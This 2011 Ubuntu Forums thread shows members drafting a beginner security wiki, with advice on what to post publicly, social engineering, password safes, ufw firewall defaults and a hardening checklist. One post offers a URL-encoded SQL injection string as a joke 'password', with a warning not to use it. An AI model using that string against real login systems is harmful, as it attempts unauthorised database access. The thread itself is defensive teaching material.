Obvious things not to post are public/internet facing IP addressess for hopefully obvious reasons, but does a noob know the difference between a WAN IP and a LAN IP, do they know and understand NAT routing and Private addresses such as Class C 192.168.x.x etc If they dont know they wont know what to not post or not. 

Posting internal addresses is usually of no consequence as every potential attacker knows that most typical users are using the same internal addresssing, as most routers default to 192.168.0.1 or 192.168.1.1 and assign DHCP addresses in that scope anyways (NAT routed) so no big deal unless of course the user is savvy enough to provide his own internal addressing scheme, which on the face of it is no big deal to post, but a savvy attacker or information harvester can read into this type of thing and gleem a analysis of the type of user/admin and similar judegment calls they may make elsewhere in configuration.

Sometimes it is not about what you post but what you dont, a lot of information can be harvested from that also, of course this depends on the information gatherers skillset.

posting things like "i have setup my router to port forward x,y and z as i want to use x,y,z, services" cna be good or bad, good to help solve the problem they may be having, bad if eleswhere an attacker has been able to gather some other information such as public IP.

It is a balance which can only be achieved with knowledge and so a vicious circle.

there is no simple answer as to what you should post and what not to post.

A noob is keen to post everything they can to get there issue sorted, i mean people read the security stickies, read all about ROOTSUDO and still decide they want to enable root and log on with it or post saying they are logged on as root.

*mmmm lets think about that, i am malicious, i see the person is logged on as root, i see they are browsing the net by the fact they are posting in forum about being logged on as root, i could post a link to something unsavoury in my post or a PM to them or via IM as on their profile they have MSN or ICQ and hey presto no work on my part. All from a UF post about being logged on as root, catch my drift.*

What to post and what not ? nothing dangerous, what is dangerous ? well you need the knowledge to know.

but the wiki is coming along and hopefully the information in this thread and elsewhere will help produce something useful.

keep up the good work

cheers

---

### Post by Ms. Daisy on 2011-11-04
> **haqking said:**
> What to post and what not ? nothing dangerous, what is dangerous ? well you need the knowledge to know. OK, thanks.  And I think the Root user thing is well covered elsewhere.  We mention it as something to avoid doing, that's the best we can do.

It sounds like knowing what to post is one of those things that can't be distilled.  I modified the social engineering section of the wiki to reflect that, let me know what you think.

---

### Post by haqking on 2011-11-04
> **Ms. Daisy said:**
> OK, thanks.  And I think the Root user thing is well covered elsewhere.  We mention it as something to avoid doing, that's the best we can do.

It sounds like knowing what to post is one of those things that can't be distilled.  I modified the social engineering section of the wiki to reflect that, let me know what you think.

yeah i have made a few changes to the social engineering section, added a little info.

it is late where i am so i may need to revisit it tomorrow ;-)

I havent really added much as i dont want over complicate things, i will carry on editing what gets posted as is DT and others i believe.

Cheers

---

### Post by WasMeHere on 2011-11-05
I wrote 'a request for clarification' in the wiki  about social engineering {any drive by downloads}???

and I think that so many people use WLAN, so include the section about it!

---

### Post by haqking on 2011-11-05
> **Olle Wiklund said:**
> I wrote 'a request for clarification' in the wiki  about social engineering {any drive by downloads}???

and I think that so many people use WLAN, so include the section about it!

i clarified

A drive by download, is an unauthorised download (possibly of malware,rootkit etc) or even an authorised download where the consequence was not understood

---

### Post by OpSecShellshock on 2011-11-05
> **haqking said:**
> i clarified

A drive by download, is an unauthorised download (possibly of malware,rootkit etc) or even an authorised download where the consequence was not understood

Just to add to this: a drive-by involves code on a web page causing a software installation or system change to be run on the local system--outside the browser process--without any user interaction. Social engineering in the context of malicious code execution involves attackers convincing the user to do the same thing manually. Outside that context, social engineering is an incredibly broad topic (it's something you encounter at every car dealership, for example).

---

### Post by haqking on 2011-11-05
> **OpSecShellshock said:**
> Just to add to this: a drive-by involves code on a web page causing a software installation or system change to be run on the local system--outside the browser process--without any user interaction. Social engineering in the context of malicious code execution involves attackers convincing the user to do the same thing manually. Outside that context, social engineering is an incredibly broad topic (it's something you encounter at every car dealership, for example).

indeed.

People often assume Social engineering only relates to IT.  Far from it is is a tool or method of interaction/manipulation that has existed for centuries and where the techniques are easily applied to IT & Security.

---

### Post by CharlesA on 2011-11-05
> **haqking said:**
> indeed.

People often assume Social engineering only relates to IT.  Far from it is is a tool or method of interaction/manipulation that has existed for centuries and where the techniques are easily applied to IT & Security.

Yeah. It is used everywhere, and not just for "malicious" purposes, unless you count making you want to buy something malicious. :lol:

Car dealership is a big one, but also recruiters are up there too.

---

### Post by haqking on 2011-11-05
> **CharlesA said:**
> Yeah. It is used everywhere, and not just for "malicious" purposes, unless you count making you want to buy something malicious. :lol:

Car dealership is a big one, but also recruiters are up there too.

spouses use it all the time ;-)

---

### Post by CharlesA on 2011-11-05
> **haqking said:**
> spouses use it all the time ;-)
Those too. Heh.

---

### Post by WasMeHere on 2011-11-05
> **Olle Wiklund said:**
> I wrote 'a request for clarification' in the wiki  about social engineering {any drive by downloads}???

and I think that so many people use WLAN, so include the section about it!
I also added to the text about encryption, because I have seen quite a few people locking themselves out from their data.

---

### Post by vasa1 on 2011-11-05
Apropos this:
> Know What You Have, Have What You Know

Don't run services you don't need. Do you really need a VOIP phone system? If you do, make sure you understand it and can properly secure it. 

Servers: If you don't need an SSH server or VNC server running on your personal computer don't do it. If you don't know what those acronyms are, then you should DEFINITELY not use them until you do some significant research. 

Until you do understand how it works, my recommendation would be to not set those things up, **and if they are set up by default, disable them**. When you're ready to start learning new services like FTP, SSH, VNC, telnet, remote desktop, etc., then consider playing with them in a virtual machine. Ubuntu has Oracle VM Virtual Box right in the Software Center. This can reduce your exposure to security problems you don't know while you learn. Of course it's not fool-proof.

From: [https://wiki.ubuntu.com/BasicSecurity](https://wiki.ubuntu.com/BasicSecurity)

Great going all!

I'd like a clarification about the stuff I made **bold** in the quote above.

Assuming someone does a totally clean install of the current Ubuntu, are there really any default processes (services?) that could/should be turned off if there's no need?

And this is my contribution towards a more secure browser (from something [that came up today]("http://ubuntuforums.org/showpost.php?p=11426722&postcount=4")).
In Firefox, my suggestion is to go to Edit, Preferences, Applications, and keep as many applications as you can set as "Always Ask" rather than "Open with". That way, you'll know if something is *trying* to start something behind your back. I know it can be irritating to be questioned by the browser but, IMHO, it's safer!

---

### Post by Dangertux on 2011-11-05
K...So yeah I was going to edit it but, it's constantly locked at this point, which is fine. I will just put my suggestions here. 

As far as the social engineering thing goes. There is a lot that could go in there, and I'm really not sure the depth you want to get into it.

Technically a great deal of the following can fall under Social Engineering as well.

- XSS / CSRF
- Click Jacking / Session Riding
- MiTM : ARP/DNS Poisoning, Airbase attacks etc (usually because something has to be done to get past the fact the attacker isn't a certificate authorit)
- Sometimes drive by download style attacks involve multiple components of this , either MiTM or XSS/CSRF, or straight social engineering techniques to get you to the site to begin with.
- Phishing/Spear Phishing : these are essentially the same thing but spear phishing is more targeted.
- Email header forgery : got an email from Tom in IT that says to install this new patch, it's not really from Tom in IT.


There are probably a few others that I'm having trouble thinking of as well. Not sure if these are really appropriate but they do fall in to the SE category.

Remember , hugs are worth more than handshakes ;-)

---

### Post by haqking on 2011-11-05
> **Dangertux said:**
> K...So yeah I was going to edit it but, it's constantly locked at this point, which is fine. I will just put my suggestions here. 

As far as the social engineering thing goes. There is a lot that could go in there, and I'm really not sure the depth you want to get into it.

Technically a great deal of the following can fall under Social Engineering as well.

- XSS / CSRF
- Click Jacking / Session Riding
- MiTM : ARP/DNS Poisoning, Airbase attacks etc (usually because something has to be done to get past the fact the attacker isn't a certificate authorit)
- Sometimes drive by download style attacks involve multiple components of this , either MiTM or XSS/CSRF, or straight social engineering techniques to get you to the site to begin with.
- Phishing/Spear Phishing : these are essentially the same thing but spear phishing is more targeted.
- Email header forgery : got an email from Tom in IT that says to install this new patch, it's not really from Tom in IT.


There are probably a few others that I'm having trouble thinking of as well. Not sure if these are really appropriate but they do fall in to the SE category.

Remember , hugs are worth more than handshakes ;-)

+1

I am struggling to figure out what to put in there and what not, right now i am just adding a little too or editing what is already there.

If we go down the reality route it wont be a newbie wiki. ;-)

---

### Post by MrLeek on 2011-11-05
> **vasa1 said:**
> Apropos this:


From: [https://wiki.ubuntu.com/BasicSecurity](https://wiki.ubuntu.com/BasicSecurity)

Great going all!

I'd like a clarification about the stuff I made **bold** in the quote above.

Assuming someone does a totally clean install of the current Ubuntu, are there really any default processes (services?) that could/should be turned off if there's no need?

And this is my contribution towards a more secure browser (from something [that came up today]("http://ubuntuforums.org/showpost.php?p=11426722&postcount=4")).
In Firefox, my suggestion is to go to Edit, Preferences, Applications, and keep as many applications as you can set as "Always Ask" rather than "Open with". That way, you'll know if something is *trying* to start something behind your back. I know it can be irritating to be questioned by the browser but, IMHO, it's safer!

A really good question and a good suggestion (at least I think!) . It would be nice if a user could quickly change this list to "always ask" - again, if it's easy to do then newbies will try to do it.

My other questions for the wiki page (and I had thought of it before vasa's post!):

- What things should a user check for and remove/block/uninstall following a clean install?
- Is saving passwords in the browser safe? Why/why not?
- Is a password safe a good thing? What's the best one to use?
- Are there any "must do" rules when setting up a firewall?

and a bit "out there" - can a tv/blu-ray player that can connect to the internet be compromised?

---

### Post by MrLeek on 2011-11-05
> **haqking said:**
> 

I am struggling to figure out what to put in there and what not, right now i am just adding a little too or editing what is already there.

If we go down the reality route it wont be a newbie wiki. ;-)

I'm thinking about how it would look if we stripped it all back (not deleting any of the good stuff there) - resulting in:

Post 1) Overview, stupid things to avoid and quick wins to improve things
Post 2) passwords, credentials and social engineering
Post 3) network security, firewalls, etc.
Post 4) whatever....

Perhaps then it's in a good place to make it a sticky on the forums?

---

### Post by CharlesA on 2011-11-05
> **MrLeek said:**
> I'm thinking about how it would look if we stripped it all back (not deleting any of the good stuff there) - resulting in:

Post 1) Overview, stupid things to avoid and quick wins to improve things
Post 2) passwords, credentials and social engineering
Post 3) network security, firewalls, etc.
Post 4) whatever....

Perhaps then it's in a good place to make it a sticky on the forums?
Good points.

If it keeps getting responses, it won't need a sticky. ;)

---

### Post by WasMeHere on 2011-11-05
I think the wiki format is good. And it should interact with a number of sticky threads (the present ones, and maybe some new ones). Maybe the two formats will attract different people to the common database.

---

### Post by CharlesA on 2011-11-05
> **Olle Wiklund said:**
> I think the wiki format is good. And it should interact with a number of sticky threads (the present ones, and maybe some new ones). Maybe the two formats will attract different people to the common database.
Sounds like a good idea to me.

It's easier to edit a wiki page then it is to edit a forum post, since only the poster or a mod/admin can edit a post and anyone can edit a wiki page.

That's not even mentioning version control since the wiki keeps a history of every edit made.

---

### Post by MrLeek on 2011-11-05
Yea can do. I've got no opinions where it's located, as long as it's read and found useful. 

Unless someone make a major criticism of this idea, I'm going to break it out into 3-4 separate pages later today/tomorrow. Firstly, it's getting quite long - even with editing it's arguably too big to read in one sitting. Secondly, there's lots of people looking to get involved and make edits it seems - and a single page is more likely to be locked for editing.

Edit: the only potential catch with using a wiki is this. If we end up with step-by-step instructions to setting up gufw (for example) there's nothing to stop someone adding ...."bad advice" to the mix. Yeah we'll know who did it but someone might fall for it and delete /bin (as it's the bin right?) or something equally daft.

---

### Post by Dangertux on 2011-11-05
> **MrLeek said:**
> A really good question and a good suggestion (at least I think!) . It would be nice if a user could quickly change this list to "always ask" - again, if it's easy to do then newbies will try to do it.

My other questions for the wiki page (and I had thought of it before vasa's post!):

- What things should a user check for and remove/block/uninstall following a clean install?
- Is saving passwords in the browser safe? Why/why not?
- Is a password safe a good thing? What's the best one to use?
- Are there any "must do" rules when setting up a firewall?

and a bit "out there" - can a tv/blu-ray player that can connect to the internet be compromised?

To answer the last question. ANYTHING can be compromised. 

Other questions

- A clean install IMO needs addition, not subtraction for security purposes. One may consider disabling CUPS if they don't need it.

- No , because they can be read in the event of a successful browser exploits

- They generally are fine, but if you're super paranoid no.

- A firewall is based on individual needs, my best suggestion still remains strong inbound AND outbound filtering as well as hardening of default policies in regards to syn_cookies, forwarding etc (on some Linux distros, Ubuntu's seem fairly decent by default).

In addition since there were 5 posts since I posted this originally. In regards to the format, I think the wiki is fine, but I almost think it should be streamlined a little. To me it seems like information is all over the place and doesn't flow as well as it should.

My general opinion when it comes to securing a network or single system is start at the base and move upward.

So you would start with things like credentials and permissions,  moving outward toward application security (Updates,MAC/Addons etc), then finally network security (firewall and network appliances) and then on to new systems on the network. The threats and risks could be covered in each section as ultimately it's a guide (I think?) on creating a secure configuration, not a common attack vectors 101 post. Truth is most people don't care about the definition of ARP poisoning, buffer overflows, ROP kernel escalation, they want to know that their configuration protects them, so a cursory mention of what threats are addressed where would be sufficient in my opinion


Hope this helps.

---

### Post by haqking on 2011-11-05
> **MrLeek said:**
> Yea can do. I've got no opinions where it's located, as long as it's read and found useful. 

Unless someone make a major criticism of this idea, I'm going to break it out into 3-4 separate pages later today/tomorrow. Firstly, it's getting quite long - even with editing it's arguably too big to read in one sitting. Secondly, there's lots of people looking to get involved and make edits it seems - and a single page is more likely to be locked for editing.

To be honest i really dont think it is gonna end up in a NEWBIE document.

If me, DT, Opsecshellshock, and others keep editing or contributing to it, it is gonna seriously overwhelm you guys IMO.

I think IMO it would be better if all compostition/editing is left up to yourself, Ms Daisy and other newbs involved.

We can read it and raise points here quoting the wiki and you can go back to noobify it.

I hope you guys get it the way you want, but there is so much to cover.

---

### Post by CharlesA on 2011-11-05
> **haqking said:**
> To be honest i really dont think it is gonna end up in a NEWBIE document.

If me, DT, Opsecshellshock, and others keep editing or contributing to it, it is gonna seriously overwhelm you guys IMO.

I think IMO it would be better if all compostition/editing is left up to yourself, Ms Daisy and other newbs involved.

We can read it and raise points here quoting the wiki and you can go back to noobify it.

I hope you guys get it the way you want, but there is so much to cover.

+1. I'm just getting into security myself and some of the stuff DT and the others talk about is a bit over my head, so I can only imagine how it would look to a newbie.

@DT: The only real disadvantage I see of a password safe is forgetting the main password/passphrase or not using a complex enough passphrase.

Are there other disadvantages?

---

### Post by haqking on 2011-11-05
> **CharlesA said:**
> +1. I'm just getting into security myself and some of the stuff DT and the others talk about is a bit over my head, so I can only imagine how it would look to a newbie.

@DT: The only real disadvantage I see of a password safe is forgetting the main password/passphrase or not using a complex enough passphrase.

Are there other disadvantages?

well a password safe is just that, yes you can forget the password, but someone can also steal the safe and spend time cracking it ;-)

best safe is in brain matter ;-)

like DT says, depends on paranoia levels

---

### Post by Dangertux on 2011-11-05
> **CharlesA said:**
> +1. I'm just getting into security myself and some of the stuff DT and the others talk about is a bit over my head, so I can only imagine how it would look to a newbie.

@DT: The only real disadvantage I see of a password safe is forgetting the main password/passphrase or not using a complex enough passphrase.

Are there other disadvantages?

Putting everything in one file, encrypted or not...Well.. Seperation of resources is good.

For two reasons, one it reduces the likelyhood of it being targeted. For instance, if I told you I had my entier life savings of $100,000 in my wallet versus 20 bucks. Would you be more inclined to rob me or someone else?

Two it also increases the likelyhood of you losing everything at one time if you forget your encryption key.

---

### Post by Ms. Daisy on 2011-11-05
> **MrLeek said:**
> I'm thinking about how it would look if we stripped it all back (not deleting any of the good stuff there) - resulting in:

Post 1) Overview, stupid things to avoid and quick wins to improve things
Post 2) passwords, credentials and social engineering
Post 3) network security, firewalls, etc.
Post 4) whatever....

Perhaps then it's in a good place to make it a sticky on the forums?If I'm understanding you correctly, I agree.  I wasn't thrilled with the layout right now because the whole thing is so mammoth & feels a little scattered.  

And Dangertux mentioned something a day or so ago about the 3 things at the very least that he'd recommend doing if you weren't willing to do anything else.  So I was thinking about adding that somewhere towards the beginning, maybe that belongs under "quick wins to improve things"

---

### Post by CharlesA on 2011-11-05
> **Dangertux said:**
> Putting everything in one file, encrypted or not...Well.. Seperation of resources is good.

For two reasons, one it reduces the likelyhood of it being targeted. For instance, if I told you I had my entier life savings of $100,000 in my wallet versus 20 bucks. Would you be more inclined to rob me or someone else?

Two it also increases the likelyhood of you losing everything at one time if you forget your encryption key.

Good point there. I didn't even think of that.

If you lose access to the password safe, you'd loose access to a ton of info and either have to reset each password individually or lose access to things if you are unable to reset their passwords.

I use one since it helps me generate very nice complex passwords that I don't exactly need to remember. Of course you'd also run into the problem of needing a password and not having access to it if you are on your phone, for example.

---

### Post by MrLeek on 2011-11-05
> **Dangertux said:**
> 
- A clean install IMO needs addition, not subtraction for security purposes. One may consider disabling CUPS if they don't need it.

Any easy ones to list here for newbies?

> **Dangertux said:**
> 
- No , because they can be read in the event of a successful browser exploits

- They generally are fine, but if you're super paranoid no.

> **haqking said:**
> well a password safe is just that, yes you can  forget the password, but someone can also steal the safe and spend time  cracking it :wink:

best safe is in brain matter :wink:


Agree with the principles here. But a password safe using a good 15 character password has to be better than reusing a simple password everywhere. Personally I wouldn't put any banking passwords in such a thing, but forums passwords are less risky. As has been said frequently - the answer depends on your approach to risk and your circumstances.

> **Dangertux said:**
> 

- A firewall is based on individual needs, my best suggestion still remains strong inbound AND outbound filtering as well as hardening of default policies in regards to syn_cookies, forwarding etc (on some Linux distros, Ubuntu's seem fairly decent by default).

Probably the one that scares most newbies the most. Zonealarm (for example) needs about 3 minutes to configure it - and people coming from Windows are looking for that sort of configuration. This might be an area where the newbie guide bridges the gaps between "know nothing" and "able to follow the various blogs/forum posts/guides on the topic".

> **Dangertux said:**
> 
In addition since there were 5 posts since I posted this originally. In regards to the format, I think the wiki is fine, but I almost think it should be streamlined a little. To me it seems like information is all over the place and doesn't flow as well as it should.

My general opinion when it comes to securing a network or single system is start at the base and move upward.


Yes, we need to spend some quality time on this part. Going to have a good read of what we've got so far later on today. Most of what I've written so far seems to fall under the "editing/clarifying" category.

---

### Post by haqking on 2011-11-05
> **MrLeek said:**
> 

Probably the one that scares most newbies the most. Zonealarm (for example) needs about 3 minutes to configure it - and people coming from Windows are looking for that sort of configuration. This might be an area where the newbie guide bridges the gaps between "know nothing" and "able to follow the various blogs/forum posts/guides on the topic".



it is even quicker with Linux/Ubuntu

```
sudo ufw default deny
```

```
sudo ufw enable
```

Then everything after that depends on the individual, custom outgoing or incoming for example, as it would with zonealarm or any other firewall app

---

### Post by Ms. Daisy on 2011-11-05
> **haqking said:**
> To be honest i really dont think it is gonna end up in a NEWBIE document.

If me, DT, Opsecshellshock, and others keep editing or contributing to it, it is gonna seriously overwhelm you guys IMO.

I think IMO it would be better if all composition/editing is left up to yourself, Ms Daisy and other newbs involved.

We can read it and raise points here quoting the wiki and you can go back to noobify it.

I hope you guys get it the way you want, but there is so much to cover.That's where it's handy to have a Type A, controlling kind of personality like me involved :D  However, I'll be devastated if you, DT & opseshellshock stop contributing.

The social engineering discussion in this thread has kind of turned into a black hole. While it's all excellent information, it can't be distilled without sounding like you're wearing your tin foil hat.  I REALLY hope we can limit that discussion in the Wiki to things _that are unique to Ubuntu_.  We should also provide links & encourage people to learn more in already existing well-written documents.

---

### Post by MrLeek on 2011-11-05
> **haqking said:**
> it is even quicker with Linux/Ubuntu <snip>



Perfection - thank you! I can write something using that now.

---

### Post by OpSecShellshock on 2011-11-05
For passwords that you don't really have to remember, you could do something like this:

```
apg -a 1 -m 18 -M SNCL
```

which should produce I think 8 passwords that are at the moment *just* good enough. They are also ridiculous, though. Replace the 18 with any arbitrary number to tweak character length. Also be aware that some services still constrain lengths and even constrain which special characters can be used. I would consider those services unsafe to use, if only because those restraints might indicate fundamentally unsafe authentication mechanisms, which means there's no telling what else they do that's unsafe. Sometimes you aren't given a choice whether to use them or not, though. In those cases do the best you can.

(incidentally, in versions prior to 11.10 I always had to install apg myself, but with 11.10 it seems to be there by default)

---

### Post by Ms. Daisy on 2011-11-05
The passwords keyring & safe is a general security concept, not one unique to Ubuntu.  I'll find a good resource that discusses the pros & cons of using them.  Sound good?

---

### Post by haqking on 2011-11-05
> **Ms. Daisy said:**
> That's where it's handy to have a Type A, controlling kind of personality like me involved :D  However, I'll be devastated if you, DT & opseshellshock stop contributing.

The social engineering discussion in this thread has kind of turned into a black hole. While it's all excellent information, it can't be distilled without sounding like you're wearing your tin foil hat.  I REALLY hope we can limit that discussion in the Wiki to things _that are unique to Ubuntu_.  We should also provide links & encourage people to learn more in already existing well-written documents.

oh no i dont mean i wont contribute.  I just meant evertytime i go to i know it will extend over and above what you wish to achieve in terms of readability and understanding.

This thread seems to be covering it, to which you guys go back and noob it up.

I am still editing it here and there,im just refraining from adding much information or it will not abstract the complex

also there is not many security concepts that are unique to ubuntu per se.

---

### Post by CharlesA on 2011-11-05
> **OpSecShellshock said:**
> For passwords that you don't really have to remember, you could do something like this:

```
apg -a 1 -m 18 -M SNCL
```

which should produce I think 8 passwords that are at the moment *just* good enough. They are also ridiculous, though. Replace the 18 with any arbitrary number to tweak character length. Also be aware that some services still constrain lengths and even constrain which special characters can be used. I would consider those services unsafe to use, if only because those restraints might indicate fundamentally unsafe authentication mechanisms, which means there's no telling what else they do that's unsafe. Sometimes you aren't given a choice whether to use them or not, though. In those cases do the best you can.

(incidentally, in versions prior to 11.10 I always had to install apg myself, but with 11.10 it seems to be there by default)

Nice command! I've seen sites restrict passwords to alphanumeric with no symbols for some reason and it makes no sense to me. The only thing I can really think of is that since the passwords are stored in a db, having a special character could be issues (which shouldn't be the case, if you sanitize anything that accesses the db).

---

### Post by MrLeek on 2011-11-05
In the meantime I'm being a bit ruthless and editing stuff out. I'm saving it at the bottom to make it easy(ish) to work out what's getting removed.

Ms. Daisy - You're defo the brains behind this (the wiki page kinda spring up around me). Hopefully I've been more proactive in the last day or so.

---

### Post by Dangertux on 2011-11-05
In regards to the firewall, building a decent firewall with Ubuntu is pretty easy to do, it shouldn't take more than 5-10 minutes even if its your first time.If you'd like I will write some simple instructions for doing it with GUFW (the GUI front end) complete with happy screenshots etc... There might be something like this out there , I remember seeing it for UFW on bodhi.zazen's blog, but don't remember if he has one for GUFW. IIt really shouldn't be intimidating. In all reality for a "newbie" to get a decent level of security from default install to done should take less than an hour if they're following decent instructions. MOST of the default settings are fine. 

The biggest changes are browser addons and configuring the default firewall policies stronger. Apparmor if that is something you want to broach as well.

However permissions and the like are fine on a default install. (Directories 751 , Files 644, with the exception of some ,  640, 600, 400 for system files)

Strong passwords are taken care of (at least in terms of system security) at install time so as long as they know it needs to happen they can do it.

Home directory encryption can also occur then, as well as more advanced encryption options if you're not doign a default desktop install.

You also have updates which can be done during install time or immediately after.

So ultimately a lot of it is laid out very easily for you.

If I were wanting to create a "relatively secure desktop system" this is what I would do with a Ubuntu install

1 - Install with strong passwords and separate /home / partitions
2 - Encrypted /home
3 - Update during install
4 - Update immediately after install
5 - Apparmor Profiles for (browser, media player, email client, chat client, and anything else I use that connects to the internet or accepts input from anything other than me)
6 - Add NoScript to browser 
7 - Strong inbound/outbound Firewall

That would be my order.

---

### Post by haqking on 2011-11-05
> **MrLeek said:**
> Perfection - thank you! I can write something using that now.

well remember that is a very basic default setup.

it will likely need to be modified to suit certain services, apps etc.

DT firewall thread covered it all

---

### Post by CharlesA on 2011-11-05
> **Dangertux said:**
> In regards to the firewall, building a decent firewall with Ubuntu is pretty easy to do, it shouldn't take more than 5-10 minutes even if its your first time.If you'd like I will write some simple instructions for doing it with GUFW (the GUI front end) complete with happy screenshots etc... There might be something like this out there , I remember seeing it for UFW on bodhi.zazen's blog, but don't remember if he has one for GUFW. IIt really shouldn't be intimidating. In all reality for a "newbie" to get a decent level of security from default install to done should take less than an hour if they're following decent instructions. MOST of the default settings are fine. 

I think that would be awesome, if you could do that.

Could even add it here or to the firewall sticky. :)

---

### Post by Ms. Daisy on 2011-11-05
> **MrLeek said:**
> In the meantime I'm being a bit ruthless and editing stuff out. I'm saving it at the bottom to make it easy(ish) to work out what's getting removed.
Brilliant!

This is incredible- I have to refresh my browser every 10 seconds to make sure I'm seeing all the contributions.  You guys are the best.

edit: and +1 to DT's firewall discussion.

---

### Post by OpSecShellshock on 2011-11-05
> **CharlesA said:**
> Nice command! I've seen sites restrict passwords to alphanumeric with no symbols for some reason and it makes no sense to me. The only thing I can really think of is that since the passwords are stored in a db, having a special character could be issues (which shouldn't be the case, if you sanitize anything that accesses the db).

Yeah, this is why I'm saying those sites and services should be approached with caution. *Non-n00b alert* A lot of special characters act as operators in databases, and the implication when they aren't allowed in passwords is that the passwords are being passed directly to the database and the developers don't want things to break. This means that there's no salting or hashing going on, which, look it's 2011, the necessary computing power is cheap, and there is no excuse for not salting and hashing. So if a service is failing to do that, then what else are they failing to do. *N00b safe again* Remember that when signing up for things you are trusting information that might be sensitive to third parties, and not all third parties are equal. Trust judiciously.

---

### Post by MrLeek on 2011-11-05
> **Ms. Daisy said:**
> Brilliant!

This is incredible- I have to refresh my browser every 10 seconds to make sure I'm seeing all the contributions.  You guys are the best.

edit: and +1 to DT's firewall discussion.

+1 to DT's firewall as well. 

First pass thought the wiki page done (my turn to cook tonight). Social Engineering is currently on the cutting room floor (there's loads of stuff about it out there) as is a bunch of other things that wasn't "primarily" Ubuntu in need. That's not a perfect setup - personally I think people need a 30 second "how not to use No Script".

What did jump out at me was that once you get below The Nuts and Bolts of Basic Security and read the Common Sense section....that's when you get into the detail. Danger's outline was spot on; each section from there should have a 1 para "what it is" and then something that explains "what to do about it" - that could be a link to something or more detailed instructions.

Anyway my skillz are needed in the kitchen! :P

---

### Post by CharlesA on 2011-11-05
> **OpSecShellshock said:**
> Yeah, this is why I'm saying those sites and services should be approached with caution. *Non-n00b alert* A lot of special characters act as operators in databases, and the implication when they aren't allowed in passwords is that the passwords are being passed directly to the database and the developers don't want things to break. This means that there's no salting or hashing going on, which, look it's 2011, the necessary computing power is cheap, and there is no excuse for not salting and hashing. So if a service is failing to do that, then what else are they failing to do. *N00b safe again* Remember that when signing up for things you are trusting information that might be sensitive to third parties, and not all third parties are equal. Trust judiciously.

Yeah. That's the scary part. Unencrypted passwords stored in a db are not my idea of security.

---

### Post by OpSecShellshock on 2011-11-05
Some things to consider while defining and narrowing the scope:

1. There are a lot of security issues that apply far more broadly than a single desktop system, but which are important to consider when securing the system. It may be worth it to either include those things or to put them in a separate document that is referenced somewhere.

2. When you fire up the browser, you are in many ways effectively leaving the OS behind. The browser is immensely powerful already, its power is growing, and the incentive of service providers is to enable it to be used to do as many things as possible. A lot of the risk resides where the functionality is, and so it might be worth it to give the browser its own large area in the document.

---

### Post by Dangertux on 2011-11-05
> **OpSecShellshock said:**
> Yeah, this is why I'm saying those sites and services should be approached with caution. *Non-n00b alert* A lot of special characters act as operators in databases, and the implication when they aren't allowed in passwords is that the passwords are being passed directly to the database and the developers don't want things to break. This means that there's no salting or hashing going on, which, look it's 2011, the necessary computing power is cheap, and there is no excuse for not salting and hashing. So if a service is failing to do that, then what else are they failing to do. *N00b safe again* Remember that when signing up for things you are trusting information that might be sensitive to third parties, and not all third parties are equal. Trust judiciously.

This is an awesome password to try in those cases 
```

'%20OR%20passwords%20IS%20NOT%20NULL%20OR%20passwords%20=%20' --;

```


;-) 

*note this is a joke...do not do this : I'm pretty sure it's malformed anyway, and if that works on any site you are trusting your personal information with run for the hills...

---

### Post by haqking on 2011-11-05
> **Dangertux said:**
> This is an awesome password to try in those cases 
```

'%20OR%20passwords%20IS%20NOT%20NULL%20OR%20passwords%20=%20' --;

```


;-) 

*note this is a joke...do not do this : I'm pretty sure it's malformed anyway, and if that works on any site you are trusting your personal information with run for the hills...

damn it you got my universal login.

I told you information gathering was easy ;-)

---

### Post by OpSecShellshock on 2011-11-05
> **MrLeek said:**
> personally I think people need a 30 second "how not to use No Script".

Never, ever exercise the "allow scripts globally (dangerous)" option. Never select "temporarily allow all this page." That's less than 30 seconds, yes? Doesn't cover nearly everything as the add-on is full of really interesting options that cover a lot of use cases, but for things to not do it's a start.

---

### Post by Ms. Daisy on 2011-11-05
> **Ms. Daisy said:**
> Brilliant!

This is incredible- I have to refresh my browser every 10 seconds to make sure I'm seeing all the contributions.  You guys are the best.

edit: and +1 to DT's firewall discussion.
I think MrLeek is editing the Wiki right now so I'll dump this idea here.  I found this link regarding general password creation & safety:
[http://www.symantec.com/connect/articles/simplest-security-guide-better-password-practices](http://www.symantec.com/connect/articles/simplest-security-guide-better-password-practices)

And what do you think about linking to the SANS reading room? Good idea or bad?  Of course I found some good social engineering articles there.

---

### Post by OpSecShellshock on 2011-11-05
> **Ms. Daisy said:**
> I think MrLeek is editing the Wiki right now so I'll dump this idea here.  I found this link regarding general password creation & safety:
[http://www.symantec.com/connect/articles/simplest-security-guide-better-password-practices](http://www.symantec.com/connect/articles/simplest-security-guide-better-password-practices)

And what do you think about linking to the SANS reading room? Good idea or bad?  Of course I found some good social engineering articles there.

Well if what you want is a good reading list, I hope you have a couple months clear.

---

### Post by Ms. Daisy on 2011-11-05
> **OpSecShellshock said:**
> Well if what you want is a good reading list, I hope you have a couple months clear. :D You mean like my in-box which has about 30 new emails each day for great new sec articles?  I don't know how anyone stays well read on the subject.  Who's got that kind of time?

---

### Post by CharlesA on 2011-11-05
> **Ms. Daisy said:**
> :D You mean like my in-box which has about 30 new emails each day for great new sec articles?  I don't know how anyone stays well read on the subject.  Who's got that kind of time?
Someone with a DeLorean...

;)

---

### Post by haqking on 2011-11-05
> **OpSecShellshock said:**
> Well if what you want is a good reading list, I hope you have a couple months clear.

couple of months ? i started reading security specific material in the mid 90's, i still havent caught up with my list from then let alone the new stuff...LOL

Ive still got the rainbow series on CD which i ordered in the late 90's to read......we say security is a process and layered approach which of course it is, it is also a non stop education and learning curve that never ends and only steepens ;-)

---

### Post by haqking on 2011-11-05
> **CharlesA said:**
> Someone with a DeLorean...

;)

My buddy has one rusting away in his garden about 20 minutes away from me.

I think he sold the FluxBox capacitor on ebay though ;-)

---

### Post by CharlesA on 2011-11-05
> **haqking said:**
> couple of months ? i started reading security specific material in the mid 90's, i still havent caught up with my list from then let alone the new stuff...LOL

Lol yeah, it's always changing and there is more and more stuff you need to be aware of.

> **haqking said:**
> My buddy has one rusting away in his garden about 20 minutes away from me.

I think he sold the FluxBox capacitor on ebay though ;-)

Well at least it used FluxBox! ;)

---

### Post by Ms. Daisy on 2011-11-05
> **CharlesA said:**
> Someone with a DeLorean...

;)ROFL!  88 mph, come on!!  And I'm sad I missed that ebay auction for the FluxBox capacitor.

Dense but informative  [http://www.sans.org/reading_room/whitepapers/engineering/social-engineering-means-violate-computer-system_529](http://www.sans.org/reading_room/whitepapers/engineering/social-engineering-means-violate-computer-system_529)


This one is rather succinct: [http://www.us-cert.gov/cas/tips/ST04-014.html](http://www.us-cert.gov/cas/tips/ST04-014.html)

